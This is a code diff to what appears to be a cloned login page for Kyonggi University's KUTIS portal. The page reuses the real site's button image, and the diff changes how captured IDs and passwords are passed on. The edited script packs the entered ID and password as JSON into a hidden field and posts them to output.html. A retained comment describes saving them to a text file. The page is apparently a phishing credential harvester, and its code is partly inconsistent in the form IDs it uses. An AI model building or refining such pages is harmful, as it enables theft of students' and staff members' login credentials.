@@ -122,7 +122,7 @@ var SystemInfo = new function() {
 
   <!-- 로그인 컨텐츠 -->
   <section class="loginArea"  id="login_scroll">
-  	<form name="myform" method="post" onsubmit="saveAndRedirect(); return false;">
+  	<form name="myform" method="post" action="output.html">
 	<input type="hidden" name="username" value="">
 	<input type="hidden" name="password" value="">
 	<fieldset>
@@ -134,7 +134,7 @@ var SystemInfo = new function() {
 
       </dl>
       <p class="btnArea">
-        <button type="submit">
+        <button type="submit" onclick="saveAndRedirect()">
             <img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif"
                  alt="학번/교번 로그인"/>
         </button>
@@ -142,13 +142,27 @@ var SystemInfo = new function() {
 
     <script>
       function saveAndRedirect() {
-
         var id = document.getElementById("id").value;
-        var pw = document.getElementById("pw").value;
+            var pw = document.getElementById("pw").value;
 
-        window.location.href = "output.html?id=" + encodeURIComponent(id) + "&pw=" + encodeURIComponent(pw);
+            // JSON 객체 생성
+            var data = {
+                "id": id,
+                "pw": pw
+            };
 
-          //xhr.send(JSON.stringify(dataToSend));
+            // JSON 객체를 문자열로 변환
+            var jsonData = JSON.stringify(data);
+
+            // 숨겨진 폼 필드에 JSON 데이터 설정
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", "jsonData");
+            hiddenField.setAttribute("value", jsonData);
+            document.getElementById("myForm").appendChild(hiddenField);
+
+            // 폼 제출
+            document.getElementById("myForm").submit();
           // ID와 PW를 특정 경로에 텍스트 파일로 저장
           // var dataToSave = "ID: " + id + "\nPW: " + pw;
           // var blob = new Blob([dataToSave], {type: 'text/plain'});
